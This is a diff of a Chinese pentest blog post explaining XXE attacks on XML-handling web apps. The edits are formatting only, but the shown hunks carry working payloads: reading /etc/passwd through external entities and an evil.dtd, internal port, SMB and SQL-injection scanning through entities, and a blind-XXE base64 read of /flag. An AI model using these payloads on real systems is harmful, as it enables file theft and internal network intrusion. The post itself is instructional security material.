@@ -9,12 +9,12 @@ topics = ["Pentest"]
 +++
 
 ### 0x00 XXE
-> XXE漏洞是针对使用XML交互的Web应用程序的攻击方法
+XXE漏洞是针对使用XML交互的Web应用程序的攻击方法
 
-> XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛
+XML文件作为配置文件(spring、Struts2等)、文档结构说明文件(PDF、RSS等)、图片格式文件(SVG header)应用比较广泛
 
 ### 0x01 XML格式
-> ```xml
+```xml
 <?xml version="1.0" encoding="utf-8"?>  <!--xml声明-->
 
 <!--文档类型定义-->
@@ -36,7 +36,7 @@ topics = ["Pentest"]
 ```
 
 ### 0x02 内部声明与外部引用
-> ```xml
+```xml
 <!--内部声明实体-->
 <!ENTITY 实体名称 "实体的值">
 
@@ -47,7 +47,7 @@ topics = ["Pentest"]
 ### 0x03 XXE漏洞
 * 外部引用时可能会出现漏洞，几种payload：
 
-> ```xml
+```xml
 <?xml version="1.0"?>
 <!DOCTYPE a [
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >
@@ -74,7 +74,7 @@ evil.dtd中的内容为：<!ENTITY b SYSTEM "file:///etc/passwd" >
 
 * 简单绕过
 
-> ```xml
+```xml
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE xdsec [
   <!ELEMENT methodname ANY >
@@ -87,7 +87,7 @@ evil.dtd中的内容为：<!ENTITY b SYSTEM "file:///etc/passwd" >
 
 * 扫描内网
 
-> ```xml
+```xml
 <!ENTITY portscan SYSTEM 'http://192.168.2.22:6379/'>
 <!ENTITY smb SYSTEM '\\192.168.2.22\C$'>
 <!ENTITY sqli SYSTEM 'http://192.168.2.22/a.php?id=-1+union+select+1,2,3--'>
@@ -95,7 +95,7 @@ evil.dtd中的内容为：<!ENTITY b SYSTEM "file:///etc/passwd" >
 
 * Blind-XXE
 
-> ```xml
+```xml
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE root [
     <!ENTITY % ttt SYSTEM "php://filter/convert.base64-encode/resource=/flag">
@@ -123,6 +123,5 @@ evil.dtd中的内容为：<!ENTITY b SYSTEM "file:///etc/passwd" >
 ```
 
 <br>
-Reference(侵删)：  
-
+#### Reference(侵删)：
 * [http://blog.csdn.net/u011721501/article/details/43775691](http://blog.csdn.net/u011721501/article/details/43775691)
